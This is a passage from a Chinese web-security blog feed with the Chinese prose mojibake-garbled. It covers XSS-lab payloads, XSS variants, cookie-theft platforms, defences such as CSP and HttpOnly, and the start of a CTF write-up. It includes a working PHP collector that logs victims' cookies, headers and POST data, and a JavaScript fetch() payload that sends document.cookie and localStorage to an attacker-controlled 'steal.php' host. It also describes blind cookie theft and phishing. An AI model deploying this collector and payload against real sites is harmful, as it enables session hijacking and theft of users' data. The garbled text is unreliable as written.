class="line">?keyword=&lt;svg%0Aonload=&quot;alert(1)&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="leve17"><a href="#leve17" class="headerlink" title="leve17"></a>leve17</h3><p><img src="/../images/image-20251018013156996.png" alt="image-20251018013156996"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&gt; æ ‡ç­¾ç”¨äºåœ¨HTMLé¡µé¢ä¸­åµŒå…¥å¤–éƒ¨å†…å®¹ï¼Œå¦‚å¤šåª’ä½“æ–‡ä»¶ã€æ’ä»¶æˆ–å…¶ä»–äº¤äº’å¼å†…å®¹ã€‚å®ƒæ˜¯HTML5çš„ä¸€éƒ¨åˆ†ã€‚</span><br><span class="line">ä»¥ä¸‹æ˜¯ &lt;embed&gt; æ ‡ç­¾çš„åŸºæœ¬è¯­æ³•ï¼š</span><br><span class="line">&lt;embed src=&quot;URL&quot; type=&quot;MIME-ç±»å‹&quot; width=&quot;å®½åº¦&quot; height=&quot;é«˜åº¦&quot;&gt;</span><br><span class="line">å¸¸ç”¨çš„å±æ€§åŒ…æ‹¬ï¼š</span><br><span class="line">srcï¼šæŒ‡å®šè¦åµŒå…¥çš„å¤–éƒ¨èµ„æºçš„URLã€‚å¯ä»¥æ˜¯éŸ³é¢‘ã€è§†é¢‘ã€SWF æ–‡ä»¶ç­‰ã€‚</span><br><span class="line">typeï¼šæŒ‡å®šè¢«åµŒå…¥èµ„æºçš„MIMEç±»å‹ã€‚</span><br><span class="line">widthï¼šæŒ‡å®šåµŒå…¥å†…å®¹çš„å®½åº¦ï¼ˆåƒç´ æˆ–ç™¾åˆ†æ¯”ï¼‰ã€‚</span><br><span class="line">heightï¼šæŒ‡å®šåµŒå…¥å†…å®¹çš„é«˜åº¦ï¼ˆåƒç´ æˆ–ç™¾åˆ†æ¯”ï¼‰ã€‚</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå˜é‡æ˜¯äº’ç›¸æ‹¼æ¥èµ·æ¥çš„ï¼Œæ‰€ä»¥åœ¨è¾“å…¥arg02æ—¶åœ¨bä¹‹ååŠ ä¸€ä¸ªç©ºæ ¼ï¼Œå½“æµè§ˆå™¨è§£æåˆ°bçš„æ—¶å€™å°±åœæ­¢åˆ¤æ–­ï¼Œç„¶åå°†onclickæˆ–onmouseoverçœ‹ä½œå¦å¤–ä¸€ä¸ªå±æ€§ã€‚ä»è€Œæ‰§è¡ŒJavaScriptè¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmousemove=&#x27;alert(1)&#x27; </span><br><span class="line">?arg01=a&amp;arg02=b onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><h3 id="leve18"><a href="#leve18" class="headerlink" title="leve18"></a>leve18</h3><p>å’Œ17ä¸€æ ·</p><p><img src="/../images/image-20251018014118392.png" alt="image-20251018014118392"></p><h3 id="leve19"><a href="#leve19" class="headerlink" title="leve19"></a>leve19</h3><p>åé¢çš„flashæœ‰ç‚¹çœ‹ä¸æ‡‚äº†ï¼Œä½†æ˜¯ä¹Ÿæ˜¯å¤è€çš„ä¸œè¥¿å…ˆæ”¾ç€å§</p><h1 id="æ–‡ä»¶ä¸Šä¼ é…åˆxss"><a href="#æ–‡ä»¶ä¸Šä¼ é…åˆxss" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ é…åˆxss"></a>æ–‡ä»¶ä¸Šä¼ é…åˆxss</h1><p>å‰é¢ç”¨äº†è¿™ä¸ªxss-labæ¥äº†è§£äº†åŸºç¡€çš„xssçŸ¥è¯†ï¼Œé‚£ä¹ˆä¸‹é¢æ¥è®¤è¯†ç‰¹æ®Šçš„å‡ ç§çš„xssç³»åˆ—ï¼Œsvg-pdf-flash-mxss-uxssã€‚ã€è¿™é‡Œä¸å±•å¼€è¯´æ˜å¦‚ä½•åˆ¶ä½œï¼Œè¯¦æƒ…å¯ä»¥çœ‹å°è¿ªè€å¸ˆçš„bç«™è§†é¢‘<a href="https://www.bilibili.com/video/BV123yAYMEwb/?spm_id_from=333.1387.0.0&vd_source=3cad66818fbd72b6100b5f159983493b">ã€å°è¿ªå®‰å…¨ã€‘å…¨æ ˆç½‘ç»œå®‰å…¨ | æ¸—é€æµ‹è¯• | é«˜çº§çº¢è“å¯¹æŠ— V2024æœ€æ–°ç‰ˆ (å®Œ)_å“”å“©å“”å“©_bilibili</a>ã€‘</p><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg-xss"></a>svg-xss</h2><p>SVG(Scalable Vector Graphics)æ˜¯ä¸€ç§åŸºäºXMLçš„äºŒç»´çŸ¢é‡å›¾æ ¼å¼ï¼Œå’Œæˆ‘ä»¬å¹³å¸¸ç”¨çš„jpg&#x2F;pngç­‰å›¾ç‰‡æ ¼å¼æ‰€ä¸åŒçš„æ˜¯SVGå›¾åƒåœ¨æ”¾å¤§æˆ–æ”¹å˜å°ºå¯¸çš„æƒ…å†µä¸‹å…¶å›¾å½¢è´¨é‡ä¸ä¼šæœ‰æ‰€æŸå¤±ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•çš„æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€SVGå›¾ç‰‡å¹¶ä¸”ç¼–è¾‘å®ƒï¼Œç›®å‰ä¸»æµçš„æµè§ˆå™¨éƒ½å·²ç»æ”¯æŒSVGå›¾ç‰‡çš„æ¸²æŸ“ã€‚</p><h2 id="pdf-xss"><a href="#pdf-xss" class="headerlink" title="pdf-xss"></a>pdf-xss</h2><p>PDF XSSï¼ˆPDF è·¨ç«™è„šæœ¬ï¼‰æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡åœ¨ PDF æ–‡ä»¶ä¸­æ¤å…¥æ¶æ„ JavaScript ä»£ç ï¼Œåˆ©ç”¨ PDF é˜…è¯»å™¨æˆ–åœ¨çº¿é¢„è§ˆå·¥å…·çš„å®‰å…¨ç¼ºé™·ï¼Œå®ç°ä»£ç æ‰§è¡Œçš„ä¸€ç±»æ¼æ´ã€‚ä¸ä¼ ç»Ÿç½‘é¡µ XSS ä¸åŒï¼ŒPDF XSS çš„è½½ä½“æ˜¯ PDF æ–‡ä»¶ï¼Œæ”»å‡»åœºæ™¯æ›´éšè”½ï¼Œä¸”ä¾èµ–äº PDF å¤„ç†å·¥å…·çš„è§£æé€»è¾‘ã€‚</p><h2 id="swf-xss"><a href="#swf-xss" class="headerlink" title="swf-xss"></a>swf-xss</h2><p>SWF XSS æ˜¯ä¸€ç§é€šè¿‡ Flash æ–‡ä»¶ï¼ˆSWFï¼‰ä¸­çš„æ¼æ´æ‰§è¡Œè·¨ç«™è„šæœ¬æ”»å‡»çš„æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ SWF æ–‡ä»¶ä¸­æœªæ­£ç¡®å¤„ç†çš„è¾“å…¥å‚æ•°ï¼Œæ³¨å…¥æ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œåœ¨ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚</p><h1 id="çªå˜ä½“xss"><a href="#çªå˜ä½“xss" class="headerlink" title="çªå˜ä½“xss"></a>çªå˜ä½“xss</h1><h2 id="mxss"><a href="#mxss" class="headerlink" title="mxss"></a>mxss</h2><p>é¢„è§ˆ</p><p><a href="https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&sharetype=blogdetail&sharerId=87982018&sharerefer=PC&sharesource=2403_87580523&sharefrom=from_link">https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=87982018&amp;sharerefer=PC&amp;sharesource=2403_87580523&amp;sharefrom=from_link</a></p><h2 id="uxss"><a href="#uxss" class="headerlink" title="uxss"></a>uxss</h2><p>ç¿»è¯‘</p><p>UXSSä¿ç•™äº†åŸºæœ¬XSSçš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨æ¼æ´ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ï¼š<strong>ä¸åŒäºå¸¸è§çš„XSSï¼ŒUXSSæ˜¯ä¸€ç§åˆ©ç”¨æµè§ˆå™¨æˆ–è€…æµè§ˆå™¨æ‰©å±•æ¼æ´æ¥åˆ¶é€ äº§ç”ŸXSSçš„æ¡ä»¶å¹¶æ‰§è¡Œä»£ç çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚</strong></p><p><a href="https://juejin.cn/post/7031788659221200927">é€šç”¨è·¨ç«™è„šæœ¬æ”»å‡»(UXSS)ä»€ä¹ˆæ˜¯UXSSï¼Ÿ å¤§å®¶éƒ½çŸ¥é“æœ‰åå°„å‹XSSã€å­˜å‚¨å‹XSSã€DomXSSï¼Œè¿˜æœ‰ä¹‹å‰wooyun - æ˜é‡‘</a></p><h1 id="å¹³å°æ­å»º"><a href="#å¹³å°æ­å»º" class="headerlink" title="å¹³å°æ­å»º"></a>å¹³å°æ­å»º</h1><h2 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a>beef-xss</h2><p><a href="https://www.freebuf.com/articles/web/443592.html">XSSä¹‹Beefç®€å•ä½¿ç”¨ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>dockeræ‹‰å–æ¯”è¾ƒå¿«æ·æ–¹ä¾¿</p><h2 id="è“è²èŠ±xss"><a href="#è“è²èŠ±xss" class="headerlink" title="è“è²èŠ±xss"></a>è“è²èŠ±xss</h2><p><a href="https://blog.csdn.net/weixin_43263566/article/details/128848268">XSS è¿›é˜¶ç¯‡ï¼šä¸€æ–‡å…¨é¢äº†è§£è“è²èŠ±åŸºæœ¬ç”¨æ³•_xssè“è²èŠ±-CSDNåšå®¢</a></p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><h2 id="æ‰‹æ“"><a href="#æ‰‹æ“" class="headerlink" title="æ‰‹æ“"></a>æ‰‹æ“</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// é…ç½®å¯†ç ä¿æŠ¤</span><br><span class="line">$password = &#x27;yourpassword123&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;view&#x27;]) &amp;&amp; $_GET[&#x27;view&#x27;] === $password) &#123;</span><br><span class="line">    // æ˜¾ç¤ºæ”¶é›†çš„æ•°æ®</span><br><span class="line">    header(&#x27;Content-Type: text/html&#x27;);</span><br><span class="line">    echo &#x27;&lt;h1&gt;Stolen Data&lt;/h1&gt;&lt;pre&gt;&#x27;;</span><br><span class="line">    echo file_get_contents(&#x27;stolen_data.log&#x27;);</span><br><span class="line">    echo &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// è®°å½•æ•°æ®</span><br><span class="line">$data = [</span><br><span class="line">    &#x27;time&#x27; =&gt; date(&#x27;Y-m-d H:i:s&#x27;),</span><br><span class="line">    &#x27;ip&#x27; =&gt; $_SERVER[&#x27;REMOTE_ADDR&#x27;],</span><br><span class="line">    &#x27;cookie&#x27; =&gt; $_COOKIE,</span><br><span class="line">    &#x27;get&#x27; =&gt; $_GET,</span><br><span class="line">    &#x27;post&#x27; =&gt; $_POST,</span><br><span class="line">    &#x27;headers&#x27; =&gt; getallheaders()</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">file_put_contents(&#x27;data.txt&#x27;, json_encode($data).&quot;\n&quot;, FILE_APPEND);</span><br><span class="line"></span><br><span class="line">// è¿”å›æ— å®³å“åº”</span><br><span class="line">header(&#x27;Content-Type: image/gif&#x27;);</span><br><span class="line">echo base64_decode(&#x27;R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">fetch(&#x27;https://your-site.com/steal.php&#x27;, &#123;</span><br><span class="line">    method: &#x27;POST&#x27;,</span><br><span class="line">    headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">    body: JSON.stringify(&#123;</span><br><span class="line">        cookie: document.cookie,</span><br><span class="line">        url: location.href,</span><br><span class="line">        userAgent: navigator.userAgent,</span><br><span class="line">        localStorage: JSON.stringify(localStorage)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).catch(e =&gt; console.error(e));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="å®‰å…¨é˜²å¾¡"><a href="#å®‰å…¨é˜²å¾¡" class="headerlink" title="å®‰å…¨é˜²å¾¡"></a>å®‰å…¨é˜²å¾¡</h1><p>ã€é‡åˆ°å®‰å…¨é˜²å¾¡ï¼Œå°±è·‘è·¯å§ï¼Œæœ¬æ¥åˆ©ç”¨çš„ç‚¹å°±å°‘ï¼Œç»•è¿‡ä¹Ÿå¾ˆé¸¡è‚‹ï¼Œå¯èƒ½ctfå½“ä¸­ä¼šå‡ºç°å…³äºè€ƒç‚¹ç»•è¿‡æ‰‹æ®µï¼Œéœ€è¦ä½¿ç”¨çš„æ—¶å€™æŸ¥ç›¸åº”cveæˆ–è€…æ–‡ç« å°±å¥½äº†ã€‘</p><h2 id="csp"><a href="#csp" class="headerlink" title="csp"></a>csp</h2><p><a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=Content+Security+Policy&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiJDb250ZW50IFNlY3VyaXR5IFBvbGljeSIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjI1NDE0MDQ2NSwiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.fjiJOVS7QHKYD8ZuPn9LZzbgPjj6EmqperajT0eWUZg&zhida_source=entity">Content Security Policy</a>ï¼ˆCSPï¼‰æ˜¯ä¸€ç§æµè§ˆå™¨å®‰å…¨æœºåˆ¶ï¼Œç”¨äºé˜²æ­¢å„ç§ç±»å‹çš„<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLot6jnq5nohJrmnKzmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.Dt3u0GHZEZ5dcLGm83Eg6EEwiwKqKAjs2UuR2M7cYb0&zhida_source=entity">è·¨ç«™è„šæœ¬æ”»å‡»</a>ï¼ˆXSSï¼‰å’Œ<a href="https://zhida.zhihu.com/search?content_id=254140465&content_type=Article&match_order=1&q=%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjExMjg4MDgsInEiOiLmlbDmja7ms6jlhaXmlLvlh7siLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyNTQxNDA0NjUsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ldB8RMO-1-GDB2ZNl5nNdIIHN7NKoI0Ks91Ygu7xr6g&zhida_source=entity">æ•°æ®æ³¨å…¥æ”»å‡»</a>ã€‚é€šè¿‡å®šä¹‰ä¸€ç»„è§„åˆ™ï¼ŒCSP å…è®¸ç½‘ç«™ç®¡ç†å‘˜æŒ‡å®šå“ªäº›èµ„æºå¯ä»¥è¢«åŠ è½½å’Œæ‰§è¡Œï¼Œè¿›è€Œé™åˆ¶å¤–éƒ¨æ¶æ„è„šæœ¬çš„æ‰§è¡Œï¼Œç¡®ä¿ç½‘ç«™çš„å®‰å…¨æ€§ã€‚CSP ä¸ºç½‘ç«™æä¾›äº†ä¸€å±‚é¢å¤–çš„ä¿æŠ¤ï¼Œå¯ä»¥æœ‰æ•ˆåœ°é˜»æ­¢æ¶æ„ä»£ç æ³¨å…¥ï¼Œæå‡ç½‘ç«™çš„æŠ—æ”»å‡»èƒ½åŠ›ã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£ä»€ä¹ˆæ˜¯ CSPï¼Œå¦‚ä½•ä½¿ç”¨ CSP é…ç½® Web åº”ç”¨ç¨‹åºçš„å®‰å…¨ç­–ç•¥ã€‚</p><h2 id="httponly"><a href="#httponly" class="headerlink" title="httponly"></a>httponly</h2><p>å¦‚æœcookieä¸­è®¾ç½®äº†HttpOnlyå±æ€§ï¼Œé‚£ä¹ˆé€šè¿‡jsè„šæœ¬å°†æ— æ³•è¯»å–åˆ°cookieä¿¡æ¯ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é˜²æ­¢XSSæ”»å‡»ï¼Œçªƒå–cookieå†…å®¹ï¼Œè¿™æ ·å°±å¢åŠ äº†cookieçš„å®‰å…¨æ€§ï¼Œå³ä¾¿æ˜¯è¿™æ ·ï¼Œä¹Ÿä¸è¦å°†é‡è¦ä¿¡æ¯å­˜å…¥cookieã€‚XSSå…¨ç§°Cross SiteScriptï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œæ˜¯Webç¨‹åºä¸­å¸¸è§çš„æ¼æ´ï¼ŒXSSå±äºè¢«åŠ¨å¼ä¸”ç”¨äºå®¢æˆ·ç«¯çš„æ”»å‡»æ–¹å¼ï¼Œæ‰€ä»¥å®¹æ˜“è¢«å¿½ç•¥å…¶å±å®³æ€§ã€‚å…¶åŸç†æ˜¯æ”»å‡»è€…å‘æœ‰XSSæ¼æ´çš„ç½‘ç«™ä¸­è¾“å…¥(ä¼ å…¥)æ¶æ„çš„HTMLä»£ç ï¼Œå½“å…¶å®ƒç”¨æˆ·æµè§ˆè¯¥ç½‘ç«™æ—¶ï¼Œè¿™æ®µHTMLä»£ç ä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚å¦‚ï¼Œç›—å–ç”¨æˆ·Cookieã€ç ´åé¡µé¢ç»“æ„ã€é‡å®šå‘åˆ°å…¶å®ƒç½‘ç«™ç­‰ã€‚</p><p>ç»•è¿‡ã€å®åˆ™ä¸å¤ªç®¡ç”¨ã€‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cve-2012</span><br><span class="line"></span><br><span class="line">phpinfo</span><br><span class="line"></span><br><span class="line">flashï¼Œjavaçš„apiè·å–</span><br></pre></td></tr></table></figure><h2 id="xssfifter"><a href="#xssfifter" class="headerlink" title="xssfifter"></a>xssfifter</h2><p>å°±æ˜¯å‰é¢çš„å„ç§æ­£åˆ™çš„é™åˆ¶æ‰‹æ®µï¼Œä¾æ—§æ ‡ç­¾è¿‡æ»¤</p><h1 id="xss-stricke"><a href="#xss-stricke" class="headerlink" title="xss-stricke"></a>xss-stricke</h1><p>XSStrikeæ˜¯ä¸€æ¬¾æ£€æµ‹Cross Site Scriptingçš„é«˜çº§æ£€æµ‹å·¥å…·ã€‚å®ƒé›†æˆäº†payloadç”Ÿæˆå™¨ã€çˆ¬è™«å’Œæ¨¡ç³Šå¼•æ“åŠŸèƒ½ã€‚XSStrikeä¸æ˜¯åƒå…¶ä»–å·¥å…·é‚£æ ·æ³¨å…¥æœ‰æ•ˆè´Ÿè½½å¹¶æ£€æŸ¥å…¶å·¥ä½œï¼Œè€Œæ˜¯é€šè¿‡å¤šä¸ªè§£æå™¨åˆ†æå“åº”ï¼Œç„¶åé€šè¿‡ä¸æ¨¡ç³Šå¼•æ“é›†æˆçš„ä¸Šä¸‹æ–‡åˆ†ææ¥ä¿è¯æœ‰æ•ˆè´Ÿè½½ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒXSStrikeè¿˜å…·æœ‰çˆ¬è¡Œï¼Œæ¨¡ç³Šæµ‹è¯•ï¼Œå‚æ•°å‘ç°ï¼ŒWAFæ£€æµ‹åŠŸèƒ½ã€‚å®ƒè¿˜ä¼šæ‰«æDOM XSSæ¼æ´ã€‚</p><p><a href="https://github.com/s0md3v/XSStrike">s0md3v&#x2F;XSStrike: Most advanced XSS scanner.</a></p><p>å°±åƒsqlæ³¨å…¥ä¸­çš„sqlmap</p><h1 id="æ”»é˜²åˆ©ç”¨"><a href="#æ”»é˜²åˆ©ç”¨" class="headerlink" title="æ”»é˜²åˆ©ç”¨"></a>æ”»é˜²åˆ©ç”¨</h1><p>å…³äºxssçš„æ”»é˜²åˆ©ç”¨ï¼Œå¤šç”¨äºç»„åˆæ‹³çš„ä½¿ç”¨ä»¥åŠæ”»é˜²æ—¶å€™ï¼Œsrcåˆ©ç”¨çš„ç‚¹å°‘ï¼Œèƒ½å¼¹çª—éªŒè¯æœ‰æ¼æ´ç‚¹å°±å¥½äº†ï¼Œå·®å¼‚è¿˜æ˜¯æŒºå¤§çš„ï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œè¿˜æ˜¯æ¯”è¾ƒå¥½é£Ÿç”¨</p><h2 id="cookieç›—å–"><a href="#cookieç›—å–" class="headerlink" title="cookieç›—å–"></a>cookieç›—å–</h2><p>å°±æ˜¯ç›²æ‰“ï¼ŒæŠŠæœ‰æ•°æ®äº¤äº’çš„åœ°æ–¹éƒ½æ’ä¸Špayloadï¼Œç­‰æƒ³åº”ç™»é™†æ€çš„ç”¨æˆ·æŸ¥çœ‹æˆ–è€…ç‚¹å‡»ï¼Œä»¥è¾¾åˆ°è·å¾—cookieä¼šè¯</p><h2 id="é’“é±¼"><a href="#é’“é±¼" class="headerlink" title="é’“é±¼"></a>é’“é±¼</h2><p>å¼¹çª—è·³è½¬ç½‘é¡µï¼Œæˆ–è€…æé†’ä¸‹è½½æ›´æ–°ï¼Œå·²è¾¾åˆ°å…·ä½“æƒ³è¦ä¸Šçº¿æˆ–è€…æ•æ„Ÿä¿¡æ¯è·å–çš„æ•ˆæœ</p><h2 id="è”åˆä»£ç å®¡è®¡rce"><a href="#è”åˆä»£ç å®¡è®¡rce" class="headerlink" title="è”åˆä»£ç å®¡è®¡rce"></a>è”åˆä»£ç å®¡è®¡rce</h2><p>è¿™æ˜¯å°è¿ªå®‰å…¨2024xsséƒ¨åˆ†çš„ä¸€ä¸ªå°çš®é¢æ¿æ¡ˆä¾‹ï¼Œå…·ä½“çš„cmsåä»£ç å®¡è®¡çš„è”åŠ¨å¤–éƒ¨è¯·æ±‚è¿›è¡Œrceï¼Œéœ€è¦ç‰¹å®šæƒ…å†µä¸‹çš„xssæ¡ä»¶æ‰èƒ½äº§ç”Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªç”·äººä¸€å¥è¯æ”¹å˜æˆ‘çš„ä¸€ç”Ÿä¹‹moectf2025</title>
      <link href="/posts/63963.html"/>
      <url>/posts/63963.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å½“åˆå·å¸ˆèŒƒå¤§å­¦cssecä¿¡å®‰ç»„çš„CoHyuå¤§å¸ˆå‚…çš„ä¸€å¥moectfæ˜¯æ¢¦å¼€å¯çš„åœ°æ–¹ä»¥åŠSonderå¤§å¸ˆå‚…çš„moectfçš„é¢˜è´¨é‡éƒ½å¾ˆé«˜ï¼Œå¯ä»¥åŠ æ²¹å­¦å­¦.</span><br><span class="line">äºæ˜¯å°±æ‰“äº†moectf2025ï¼Œä½†æ—¶é—´çº¿å¤ªé•¿äº†å°±æ‰“äº†ä¸€å‘¨ï¼Œç°åœ¨å®Œèµ›äº†</span><br><span class="line">äºæ˜¯æ‰“ç®—å¤ç°ä¸€æ‰‹webä»¥åŠpwnéƒ¨åˆ†ï¼Œpwnéƒ¨åˆ†å°±æ”¾åˆ°ã€Šæ¯å¤©éƒ½è¦pwnä¸€ç‚¹ã€‹ç³»åˆ—äº†</span><br></pre></td></tr></table></figure><h1 id="moectf2025"><a href="#moectf2025" class="headerlink" title="moectf2025"></a>moectf2025</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.xidian.edu.cn/training/22</span><br></pre></td></tr></table></figure><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0-Webå…¥é—¨æŒ‡åŒ—"><a href="#0-Webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="0 Webå…¥é—¨æŒ‡åŒ—"></a><strong>0 Webå…¥é—¨æŒ‡åŒ—</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½ çŸ¥é“ä»€ä¹ˆæ˜¯æ§åˆ¶å°å—ï¼Ÿå¿«å»äº†è§£ä¸€ä¸‹å§ï¼</span><br><span class="line"></span><br><span class="line">((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]).......</span><br></pre></td></tr></table></figure><h4 id="è€ƒç‚¹ï¼šjsfuckç¼–ç ã€‚"><a href="#è€ƒç‚¹ï¼šjsfuckç¼–ç ã€‚" class="headerlink" title="è€ƒç‚¹ï¼šjsfuckç¼–ç ã€‚"></a>è€ƒç‚¹ï¼šjsfuckç¼–ç ã€‚</h4><p>å¯ä»¥æ§åˆ¶å°è§£ä¹Ÿå¯ä»¥è§£ç å·¥å…·è§£</p><p><img src="/../images/image-20251013223042633-1760512687698-47.png" alt="image-20251013223042633"></p><h3 id="01-ç¬¬ä¸€ç« -ç¥ç§˜çš„æ‰‹é•¯"><a href="#01-ç¬¬ä¸€ç« -ç¥ç§˜çš„æ‰‹é•¯" class="headerlink" title="01 ç¬¬ä¸€ç«  ç¥ç§˜çš„æ‰‹é•¯"></a><strong>01 ç¬¬ä¸€ç«  ç¥ç§˜çš„æ‰‹é•¯</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">çœæµï¼šè¿™ä¸ªæ‰‹é•¯éœ€è¦è¾“å…¥å’’è¯­æ‰èƒ½å¯å°ï¼Ÿ</span><br></pre></td></tr></table></figure><h4 id="é¢„æœŸè§£1è€ƒç‚¹-f12æŸ¥çœ‹æºç "><a href="#é¢„æœŸè§£1è€ƒç‚¹-f12æŸ¥çœ‹æºç " class="headerlink" title="é¢„æœŸè§£1è€ƒç‚¹:f12æŸ¥çœ‹æºç "></a>é¢„æœŸè§£1è€ƒç‚¹:f12æŸ¥çœ‹æºç </h4><p><img 